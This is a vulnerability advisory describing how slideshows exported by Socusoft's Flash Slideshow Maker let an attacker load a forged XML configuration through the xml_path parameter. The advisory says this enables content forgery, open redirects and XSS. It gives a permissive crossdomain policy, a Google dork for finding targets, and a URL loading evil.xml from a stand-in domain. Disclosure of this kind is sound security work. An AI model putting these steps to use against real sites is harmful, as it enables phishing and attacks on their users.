#### Summary
Socusoft's Flash Slideshow Maker is a Flash Shockwave (SWF) movie maker containing static
images which are presented in a HTML slideshow format. All versions appear to be vulnerable (http://www.socusoft.com/flash-slideshow-maker.php).

#### Description
The vulnerability identified does not exist within the software application itself, instead, the vulnerability presents itself within the application's exported files which end up hosted on an external web-server. Socusoft's Flash Slideshow Maker application has two configuration themes associated with generating the slideshow content, basic and advanced.

The basic theme will generate a single SWF file containing the content embedded
within. Whereas, the 'advanced' theme is XML driven. Meaning, in the final output,
there will be the SWF itself, image files and an XML document containing the
configuration that controls the SWFs behaviour. This 'advanced' theme
configuration is the cause of why such a vulnerability exists.

Therefore the themes associated with the advanced configuration are vulnerable,
whereas the content associated with the themes outlined in the 'basic'
configuration are not vulnerable.

This vulnerability exists not because of the SWF but due to the insecurity
associated with it's XML configuration file, and the fact that the xml_path HTTP
parameter trusts user supplied input. An attacker can pull the XML configuration
containing the SWFs behavioural structure. In doing so, the attacker can mimic,
forge and thus alter the pre-defined behaviour of the SWF by assigning malicious
arbitrary values within the associated XML configuration parameters. Exploitation
is achieved by uploading the evil XML to a web server, where it is now possible
to remotely call and include the fraudulent XML through the SWF via GET.

An attacker can perform Content Forgery, Unvalidated Redirects, and
XSS attacks against authenticated and un-authenticated users through the
dissemination of a compromised URL.

In order for any of the vulnerabilities (besides Content Forgery of course)
to execute, the victim is required to click on the image within the slides.
The likelihood of this can be enhanced through the XML configurations title
variables, and setting the title to be staticly displayed, however this persuasion
could also be conducted through the Content Forgery where a JPEG or any other
image file can be displayed containing text to persuade the victim to perform the
required user interaction.

#### Preconditions

In order to exploit this vulnerability, the attacker must have a correctly configured
crossdomain policy running on the same server that they are hosting the malicious XML
file. An example is as seen below:

```
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<site-control permitted-cross-domain-policies="all"/>
<allow-access-from domain="*" secure="false"/>
<allow-http-request-headers-from domain="*" headers="*" secure="false"/>
</cross-domain-policy>
```

#### Exploitation
Vulnerable endpoints can be located through the following Google Dork:
filetype:swf inurl:?xml_path=

~ 64,500 potentially vulnerable endpoints match this criteria.

Obtain the SWFs XML configuration, by replacing the .swf extension value with that
of the called GET .xml value stored in the xml_path HTTP parameter. Once obtained,
edit the XML configuration to control the SWFs behaviour. Finally host it on a
web server where it can then be called through setting the xml_path parameter to
point to the now manipulated XML config; ?xml_path=//domain.com/path/to/evil.xml
again, to execute XSS and evil redirects, click on the image containing the
associated payload.
